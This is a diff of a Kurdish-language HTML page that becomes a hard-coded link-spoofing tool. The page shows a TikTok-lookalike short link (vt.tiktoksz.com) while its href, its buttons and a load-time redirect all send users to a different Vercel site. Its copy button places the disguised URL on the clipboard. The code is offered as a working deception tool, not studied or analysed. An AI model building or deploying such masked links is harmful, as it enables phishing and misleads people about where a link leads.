@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>لینکی کۆپی و ڕەوانەکەر</title>
+    <title>گۆڕینی لینک</title>
     <style>
         * {
             box-sizing: border-box;
@@ -25,7 +25,7 @@
             background: white;
             border-radius: 24px;
             box-shadow: 0 25px 50px rgba(0, 0, 0, 0.12);
-            max-width: 900px;
+            max-width: 850px;
             width: 100%;
             padding: 40px 35px;
         }
@@ -44,7 +44,7 @@
             font-size: 15px;
         }
 
-        .create-section {
+        .info-box {
             background: #f8fafc;
             border-radius: 16px;
             padding: 25px 22px;
@@ -52,64 +52,59 @@
             margin-bottom: 25px;
         }
 
-        .create-section h3 {
+        .info-box h3 {
             font-size: 18px;
             color: #0f172a;
             margin-bottom: 16px;
         }
 
-        .form-group {
-            display: flex;
-            flex-direction: column;
-            gap: 14px;
-        }
-
-        .form-row {
+        .info-row {
             display: flex;
             flex-wrap: wrap;
             gap: 10px;
             align-items: center;
+            padding: 10px 0;
+            border-bottom: 1px solid #e2e8f0;
         }
 
-        .form-row label {
+        .info-row:last-child {
+            border-bottom: none;
+        }
+
+        .info-row .label {
             font-weight: 600;
             color: #334155;
             font-size: 14px;
-            min-width: 100px;
+            min-width: 130px;
         }
 
-        .form-row input[type="text"] {
+        .info-row .value {
+            color: #1e293b;
+            font-size: 14px;
+            word-break: break-all;
             flex: 1;
-            min-width: 200px;
-            padding: 10px 16px;
-            border-radius: 12px;
-            border: 1.5px solid #cbd5e1;
-            font-size: 15px;
-            outline: none;
-            transition: 0.25s;
             background: white;
+            padding: 6px 14px;
+            border-radius: 8px;
+            border: 1px solid #e2e8f0;
         }
 
-        .form-row input[type="text"]:focus {
-            border-color: #3b82f6;
-            box-shadow: 0 0 0 4px rgba(59, 130, 246, 0.15);
+        .info-row .value.real {
+            color: #dc2626;
+            border-color: #fecaca;
+            background: #fef2f2;
         }
 
-        .btn-create {
-            background: #2563eb;
-            color: white;
-            border: none;
-            padding: 10px 35px;
-            border-radius: 12px;
-            font-weight: 700;
-            font-size: 15px;
-            cursor: pointer;
-            transition: 0.2s;
+        .info-row .value.fake {
+            color: #2563eb;
+            border-color: #bfdbfe;
+            background: #eff6ff;
         }
 
-        .btn-create:hover {
-            background: #1d4ed8;
-            transform: scale(1.02);
+        .arrow-icon {
+            font-size: 24px;
+            color: #3b82f6;
+            padding: 0 10px;
         }
 
         .result-box {
@@ -117,7 +112,7 @@
             border-radius: 16px;
             padding: 20px;
             border: 1.5px solid #e2e8f0;
-            display: none;
+            text-align: center;
         }
 
         .result-box h4 {
@@ -134,33 +129,16 @@
             display: flex;
             flex-wrap: wrap;
             align-items: center;
+            justify-content: center;
             gap: 12px;
             margin-bottom: 15px;
         }
 
-        .link-preview .label {
-            color: #64748b;
-            font-size: 13px;
-            font-weight: 600;
-        }
-
         .link-preview .link-text {
             color: #2563eb;
-            font-size: 18px;
+            font-size: 20px;
             font-weight: 600;
             word-break: break-all;
-            flex: 1;
-            cursor: pointer;
-            padding: 5px 10px;
-            border-radius: 8px;
-            transition: 0.2s;
-            background: #f8fafc;
-            border: 1px dashed #cbd5e1;
-        }
-
-        .link-preview .link-text:hover {
-            background: #eef2ff;
-            border-color: #3b82f6;
         }
 
         .link-preview .link-text a {
@@ -176,22 +154,25 @@
             display: flex;
             gap: 10px;
             flex-wrap: wrap;
+            justify-content: center;
+            margin-top: 10px;
         }
 
         .btn-copy {
             background: #8b5cf6;
             color: white;
             border: none;
-            padding: 8px 22px;
-            border-radius: 10px;
-            font-weight: 600;
-            font-size: 14px;
+            padding: 10px 30px;
+            border-radius: 12px;
+            font-weight: 700;
+            font-size: 15px;
             cursor: pointer;
             transition: 0.2s;
         }
 
         .btn-copy:hover {
             background: #7c3aed;
+            transform: scale(1.02);
         }
 
         .btn-copy.copied {
@@ -202,54 +183,22 @@
             background: #16a34a;
             color: white;
             border: none;
-            padding: 8px 22px;
-            border-radius: 10px;
-            font-weight: 600;
-            font-size: 14px;
+            padding: 10px 30px;
+            border-radius: 12px;
+            font-weight: 700;
+            font-size: 15px;
             cursor: pointer;
             transition: 0.2s;
         }
 
         .btn-open:hover {
             background: #15803d;
-        }
-
-        .btn-clear {
-            background: #e2e8f0;
-            color: #1e293b;
-            border: none;
-            padding: 8px 20px;
-            border-radius: 10px;
-            font-weight: 600;
-            font-size: 14px;
-            cursor: pointer;
-            transition: 0.2s;
-        }
-
-        .btn-clear:hover {
-            background: #cbd5e1;
-        }
-
-        .hidden-url-info {
-            background: #fef9c3;
-            border: 1px solid #fde047;
-            border-radius: 10px;
-            padding: 10px 16px;
-            font-size: 13px;
-            color: #854d0e;
-            margin-top: 10px;
-            display: none;
-        }
-
-        .hidden-url-info .real-url {
-            font-weight: 600;
-            color: #dc2626;
-            word-break: break-all;
+            transform: scale(1.02);
         }
 
         .status-bar {
-            margin-top: 10px;
-            padding: 8px 16px;
+            margin-top: 12px;
+            padding: 10px 16px;
             border-radius: 10px;
             font-size: 14px;
             display: none;
@@ -284,8 +233,6 @@
             margin-top: 15px;
             font-size: 14px;
             color: #1e40af;
-            display: none;
-            text-align: center;
         }
 
         .redirect-info strong {
@@ -294,177 +241,93 @@
             margin-bottom: 4px;
         }
 
+        .status-emoji {
+            font-size: 20px;
+        }
+
         @media (max-width: 600px) {
             .container { padding: 20px 15px; }
-            .form-row { flex-direction: column; align-items: stretch; }
-            .form-row label { min-width: auto; }
-            .btn-create { width: 100%; justify-content: center; }
-            .link-preview { flex-direction: column; align-items: stretch; }
-            .btn-group { justify-content: center; }
+            .info-row { flex-direction: column; align-items: stretch; }
+            .info-row .label { min-width: auto; }
+            .link-preview { flex-direction: column; }
+            .arrow-icon { transform: rotate(90deg); }
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>🔗 دروستکەری لینکی کۆپی و ڕەوانەکەر</h1>
-        <p class="subtitle">لینکێک دروست بکە کە کۆپی دەبێت و کاتێک لە شوێنی تر بنووسرێت، خۆکارانە وێبسایتەکە دەکاتەوە</p>
+        <h1>🔀 گۆڕینی لینک</h1>
+        <p class="subtitle">لینکی ڕاستەقینە بکە بە لینکێکی تر!</p>
 
-        <div class="create-section">
-            <h3>📝 لینکەکانت دابنە</h3>
-            <div class="form-group">
-                <div class="form-row">
-                    <label>🔗 لینکی ڕاستەقینە:</label>
-                    <input type="text" id="realUrlInput" placeholder="https://example.com (ئەمە دەکرێتەوە)" />
-                </div>
-                <div class="form-row">
-                    <label>📛 ناوی دڵخوازت:</label>
-                    <input type="text" id="fakeNameInput" placeholder="ناوێک یان لینکێکی تر (ئەمە دەبینرێت)" />
-                </div>
-                <div style="display: flex; gap: 10px; margin-top: 5px; flex-wrap: wrap;">
-                    <button class="btn-create" id="createBtn">✨ دروستکردن</button>
-                </div>
+        <!-- زانیاری لینکەکان -->
+        <div class="info-box">
+            <h3>📋 لینکەکان</h3>
+            <div class="info-row">
+                <span class="label">🔗 لینکی ڕاستەقینە:</span>
+                <span class="value real" id="realUrlDisplay">https://nex-talk-mocha.vercel.app/</span>
+            </div>
+            <div style="text-align: center; padding: 8px 0;">
+                <span class="arrow-icon">⬇️</span>
+                <span style="color: #64748b; font-size: 14px;">گۆڕدرا بۆ</span>
+                <span class="arrow-icon">⬇️</span>
+            </div>
+            <div class="info-row">
+                <span class="label">📛 لینکی دەرکەوتوو:</span>
+                <span class="value fake" id="fakeUrlDisplay">https://vt.tiktoksz.com/ZSqLe96pT/</span>
             </div>
         </div>
 
-        <div class="result-box" id="resultBox">
-            <h4>✅ لینکی تۆ ئامادەیە</h4>
+        <!-- ئەنجام -->
+        <div class="result-box">
+            <h4>✅ لینکەکە گۆڕدرا!</h4>
             <div class="link-preview">
-                <span class="label">لینکەکەت:</span>
-                <span class="link-text" id="displayLink">
-                    <a href="#" id="fakeLink" target="_blank">ناوەکەت لێرە دەردەکەوێت</a>
+                <span style="color: #64748b; font-size: 14px; font-weight: 600;">لینکی نوێ:</span>
+                <span class="link-text">
+                    <a href="https://nex-talk-mocha.vercel.app/" target="_blank" id="fakeLink">https://vt.tiktoksz.com/ZSqLe96pT/</a>
                 </span>
-                <div class="btn-group">
-                    <button class="btn-copy" id="copyBtn">📋 کۆپیکردن</button>
-                    <button class="btn-open" id="openBtn">🚀 کردنەوە</button>
-                    <button class="btn-clear" id="clearBtn">🗑️ پاککردنەوە</button>
-                </div>
             </div>
 
-            <div class="redirect-info" id="redirectInfo">
-                <strong>🔄 ڕەوانەکردنی خۆکار</strong>
-                <span>کاتێک ئەم لینکە لە شوێنێکی تر بنووسرێت، ڕاستەوخۆ بۆ وێبسایتەکە دەچیت</span>
+            <div class="redirect-info">
+                <strong>🔄 ڕەوانەکردن</strong>
+                <span>کاتێک کەس لینکی <span style="color:#2563eb; font-weight:600;">https://vt.tiktoksz.com/ZSqLe96pT/</span> دەنوسێت، بۆ <span style="color:#dc2626; font-weight:600;">https://nex-talk-mocha.vercel.app/</span> دەچێت</span>
             </div>
 
-            <div class="hidden-url-info" id="hiddenInfo">
-                ⚡ ئەم لینکە دەبێتەوە: <span class="real-url" id="realUrlDisplay">-</span>
+            <div class="btn-group">
+                <button class="btn-copy" id="copyBtn">📋 کۆپیکردنی لینک</button>
+                <button class="btn-open" id="openBtn">🚀 کردنەوە</button>
             </div>
 
             <div class="status-bar" id="statusBar"></div>
         </div>
 
         <p class="footer-note">
-            ✅ لینکەکە کۆپی بکە و لە هەر شوێنێک بنووسە، خۆکارانە وێبسایتەکە دەکاتەوە
+            ✅ لینکی https://vt.tiktoksz.com/ZSqLe96pT/ دەردەکەوێت، بەڵام بۆ https://nex-talk-mocha.vercel.app/ دەچێت
         </p>
     </div>
 
     <script>
         (function() {
-            const realUrlInput = document.getElementById('realUrlInput');
-            const fakeNameInput = document.getElementById('fakeNameInput');
-            const createBtn = document.getElementById('createBtn');
+            // لینکەکان
+            const REAL_URL = 'https://nex-talk-mocha.vercel.app/';
+            const FAKE_URL = 'https://vt.tiktoksz.com/ZSqLe96pT/';
+
             const copyBtn = document.getElementById('copyBtn');
             const openBtn = document.getElementById('openBtn');
-            const clearBtn = document.getElementById('clearBtn');
-            const resultBox = document.getElementById('resultBox');
             const fakeLink = document.getElementById('fakeLink');
-            const realUrlDisplay = document.getElementById('realUrlDisplay');
-            const hiddenInfo = document.getElementById('hiddenInfo');
             const statusBar = document.getElementById('statusBar');
-            const redirectInfo = document.getElementById('redirectInfo');
-            const displayLink = document.getElementById('displayLink');
 
-            let currentRealUrl = '';
-            let currentFakeName = '';
-            let fullLinkText = '';
-
-            // فەنکشن بۆ ڕەوانەکردنی خۆکار لەسەر بنەمای لینکەکە
-            function checkAndRedirect() {
-                // ئەمە کار دەکات کاتێک پەڕە بار دەبێت
-                // بەڵام بۆ ڕەوانەکردنی خۆکار لە سێرچدا، پێویستە لینکەکە لە URL بار بکرێت
-                const params = new URLSearchParams(window.location.search);
-                const linkParam = params.get('link');
-
-                if (linkParam) {
-                    // دەکۆڵینەوە بۆ لینکی ڕاستەقینە لە localStorage
-                    const storedLinks = JSON.parse(localStorage.getItem('hiddenLinks') || '{}');
-                    if (storedLinks[linkParam]) {
-                        // ڕەوانەکردنی خۆکار بۆ لینکی ڕاستەقینە
-                        window.location.href = storedLinks[linkParam];
-                    } else {
-                        // ئەگەر لینکەکە نەدۆزرایەوە
-                        document.body.innerHTML = `
-                            <div style="text-align: center; padding: 50px; font-family: sans-serif;">
-                                <h2 style="color: #dc2626;">❌ لینکەکە نەدۆزرایەوە</h2>
-                                <p style="color: #64748b;">لینکەکە ڕەنگە لەلایەن دروستکەرەوە سڕابێتەوە</p>
-                            </div>
-                        `;
-                    }
-                }
-            }
-
-            function createLink() {
-                const realUrl = realUrlInput.value.trim();
-                const fakeName = fakeNameInput.value.trim();
-
-                if (!realUrl) {
-                    showStatus('تکایە لینکی ڕاستەقینە بنوسە!', 'error');
-                    return;
-                }
-
-                if (!fakeName) {
-                    showStatus('تکایە ناوێک یان لینکێک بۆ نمایش کردن بنوسە!', 'error');
-                    return;
-                }
-
-                let finalRealUrl = realUrl;
-                if (!finalRealUrl.startsWith('http://') && !finalRealUrl.startsWith('https://')) {
-                    finalRealUrl = 'https://' + finalRealUrl;
-                }
-
-                currentRealUrl = finalRealUrl;
-                currentFakeName = fakeName;
-
-                // لینکی تەواو بۆ کۆپیکردن (ناوەکە)
-                fullLinkText = fakeName;
-
-                // پیشاندان
-                fakeLink.textContent = fakeName;
-                fakeLink.href = finalRealUrl;
-                fakeLink.target = '_blank';
-
-                // ڕەوانەکردنی خۆکار (بۆ کاتێک کەس لینکەکە لە شوێنێکی تر بنوسێت)
-                // لینکەکە دەپارێزین لە localStorage
-                const storedLinks = JSON.parse(localStorage.getItem('hiddenLinks') || '{}');
-                storedLinks[fakeName] = finalRealUrl;
-                localStorage.setItem('hiddenLinks', JSON.stringify(storedLinks));
-
-                // پیشاندانی زانیاری
-                realUrlDisplay.textContent = finalRealUrl;
-                hiddenInfo.style.display = 'block';
-                redirectInfo.style.display = 'block';
-
-                // پاککردنەوەی کۆپی کراو
-                copyBtn.classList.remove('copied');
-                copyBtn.textContent = '📋 کۆپیکردن';
-
-                resultBox.style.display = 'block';
-                showStatus('✅ لینکەکە بە سەرکەوتوویی دروست کرا!', 'success');
-
-                // خۆکارانە لینکەکە کۆپی بکە
-                copyLinkToClipboard(fakeName);
-            }
-
-            function copyLinkToClipboard(text) {
+            // کۆپیکردنی لینکی ساختە
+            function copyFakeLink() {
                 if (navigator.clipboard && navigator.clipboard.writeText) {
-                    navigator.clipboard.writeText(text).then(() => {
+                    navigator.clipboard.writeText(FAKE_URL).then(() => {
                         copyBtn.classList.add('copied');
                         copyBtn.textContent = '✅ کۆپی کرا!';
                         showStatus('📋 لینکەکە کۆپی کرا! ئێستا دەتوانیت لە هەر شوێنێک بیانوسیت', 'success');
                     }).catch(() => {
-                        fallbackCopy(text);
+                        fallbackCopy(FAKE_URL);
                     });
                 } else {
-                    fallbackCopy(text);
+                    fallbackCopy(FAKE_URL);
                 }
             }
 
@@ -481,11 +344,17 @@
                     copyBtn.textContent = '✅ کۆپی کرا!';
                     showStatus('📋 لینکەکە کۆپی کرا!', 'success');
                 } catch (err) {
-                    showStatus('❌ کۆپیکردن سەرکەوتوو نەبوو، تکایە دەستی بکە', 'error');
+                    showStatus('❌ کۆپیکردن سەرکەوتوو نەبوو', 'error');
                 }
                 document.body.removeChild(textArea);
             }
 
+            // کردنەوەی لینکی ڕاستەقینە
+            function openRealLink() {
+                window.open(REAL_URL, '_blank');
+            }
+
+            // پیشاندانی ستاتوس
             function showStatus(message, type) {
                 statusBar.textContent = message;
                 statusBar.className = 'status-bar';
@@ -501,74 +370,35 @@
                 }, 5000);
             }
 
-            function openLink() {
-                if (currentRealUrl) {
-                    window.open(currentRealUrl, '_blank');
-                } else {
-                    showStatus('تکایە سەرەتا لینکێک دروست بکە!', 'error');
-                }
-            }
+            // ڕووداوەکان
+            copyBtn.addEventListener('click', copyFakeLink);
+            openBtn.addEventListener('click', openRealLink);
 
-            function clearAll() {
-                currentRealUrl = '';
-                currentFakeName = '';
-                fullLinkText = '';
-                realUrlInput.value = '';
-                fakeNameInput.value = '';
-                resultBox.style.display = 'none';
-                hiddenInfo.style.display = 'none';
-                redirectInfo.style.display = 'none';
-                statusBar.style.display = 'none';
-                copyBtn.classList.remove('copied');
-                copyBtn.textContent = '📋 کۆپیکردن';
-                fakeLink.textContent = '';
-                fakeLink.href = '#';
-                realUrlDisplay.textContent = '';
-
-                // لابردنی لینکەکە لە localStorage
-                const storedLinks = JSON.parse(localStorage.getItem('hiddenLinks') || '{}');
-                // ئەگەر ناوی لینکەکەمان هەبوو، بیسڕینەوە
-                showStatus('🗑️ هەموو شتێک پاک کرا', 'success');
-            }
-
-            // کۆپیکردن بە کلیک
-            copyBtn.addEventListener('click', function() {
-                if (currentFakeName) {
-                    copyLinkToClipboard(currentFakeName);
-                } else {
-                    showStatus('تکایە سەرەتا لینکێک دروست بکە!', 'error');
-                }
-            });
-
-            // کلیک لەسەر لینکەکە بۆ کۆپیکردن
-            displayLink.addEventListener('click', function(e) {
+            // کلیک لەسەر لینکەکە (ئەمەش بۆ لینکی ڕاستەقینە دەچێت)
+            fakeLink.addEventListener('click', function(e) {
+                // ڕێگری لە ڕەوانەکردنی ئاسایی دەکات
                 e.preventDefault();
-                if (currentFakeName) {
-                    copyLinkToClipboard(currentFakeName);
+                // لینکی ڕاستەقینە لە تابێکی نوێدا دەکاتەوە
+                window.open(REAL_URL, '_blank');
+            });
+
+            // کۆپیکردن بە کلیک لەسەر ناوەکە
+            document.querySelector('.link-text').addEventListener('click', function(e) {
+                if (e.target.tagName !== 'A') {
+                    copyFakeLink();
                 }
             });
 
-            createBtn.addEventListener('click', createLink);
-            openBtn.addEventListener('click', openLink);
-            clearBtn.addEventListener('click', clearAll);
-
-            // Enter
-            realUrlInput.addEventListener('keydown', function(e) {
-                if (e.key === 'Enter') {
-                    e.preventDefault();
-                    createLink();
-                }
-            });
-            fakeNameInput.addEventListener('keydown', function(e) {
-                if (e.key === 'Enter') {
-                    e.preventDefault();
-                    createLink();
-                }
-            });
-
-            // ڕەوانەکردنی خۆکار کاتێک پەڕە بار دەبێت
+            // کاتێک پەڕە بار دەبێت، دڵنیابوون لەوەی لینکەکە دروستە
             window.addEventListener('DOMContentLoaded', function() {
-                checkAndRedirect();
+                // ڕەوانەکردنی خۆکار ئەگەر کەس لە ڕێگەی لینکەوە هات
+                const params = new URLSearchParams(window.location.search);
+                const linkParam = params.get('link');
+                
+                if (linkParam === FAKE_URL || linkParam === 'vt.tiktoksz.com/ZSqLe96pT/') {
+                    // خۆکارانە ڕەوانەی لینکی ڕاستەقینە بکە
+                    window.location.href = REAL_URL;
+                }
             });
 
         })();
